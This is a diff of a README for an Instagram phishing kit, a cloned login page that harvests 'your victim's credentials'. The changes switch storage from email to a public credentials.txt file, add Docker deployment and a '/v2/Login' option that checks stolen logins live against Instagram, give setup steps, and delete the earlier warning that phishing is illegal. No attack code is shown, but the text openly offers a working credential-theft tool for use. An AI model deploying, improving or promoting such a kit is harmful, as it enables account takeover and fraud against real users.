@@ -1,5 +1,5 @@
-# Insta-login
-Instagram login page clone which sends your victim's credentials through email.</br>
+# Instagram login web application
+Instagram login page clone which save your victim's credentials through txt file.</br>
 The webpage works on both **mobile** web browsers & **desktop**.<br/>
 
 
@@ -8,44 +8,48 @@ You are solely responsible for your actions, that's obviously not me.**<br/>
 </br>
 </br>
 
+## 😆  passwords saves in `URL/static/credentials.txt` 
+
 ## 🚀 Getting started
 
-* Get the source [code](https://github.com/Abhijeetbyte/insta-login/archive/refs/heads/main.zip)
+* Get the source [code](https://github.com/vexsx/instagram-phishing)
 
-* Extract the zip and upload the website on your hosting server
+* Extract the zip and uploade the website on your hosting server
 
-  - Here I am using a free hosting service, that supports - PHP Version Selection and
- PHP mail() Features
-
-
-![image](https://github.com/Abhijeetbyte/Insta-login/assets/80936610/cebdace5-114a-4a3c-bc5b-31030b8a3547)
+* Dockerized App use it ANYWHERE !!!
 
 
-* Change receiving email address</br>
 
-  - ![img](images/email-php_LI.jpg)
-</br>
+==============================================================
+## ⚠️ Attention for use instageram validation change
+###  In `index.html` set **action** to `/v2/Login` to use instageram api validate user  inputs
 
+
+
+
+==============================================================
+## ♨️ Features
+
+* Validate the username that victims insert with Instageram !!!
+
+* first validate username then auth with user & pass to instageram 
+
+* Similarity to instageram
+
+* Dockerized web-app
+
+* Fast and 99.9% staible
+
+===============================================================
+
+## ☸️ Config
+
+* APP RUNS AT PORT `80` (**change it inside main.go**)
+
+
+================================================================
 ### Webpage 
-![Webpage](images/webpage-preview.png)
 
-</br>
-
-* As soon as someone enter **username** & **password** and click on **Log In** button, you will receive an email</br>
-
-  - ![img](images/received-email.png)
- 
-
-<br/>
-
-
-**Important Note:**
-
-This example demonstrates a highly unethical practice of phishing, which is illegal and punishable by law. Unauthorized collection of personal data can lead to severe legal consequences, including imprisonment and substantial fines. This information is provided solely for educational purposes to understand and recognize phishing tactics. Always use your technical skills responsibly and legally.
-
-
-
-
-
+![Webpage](static/images/webpage-preview.png)
 
 
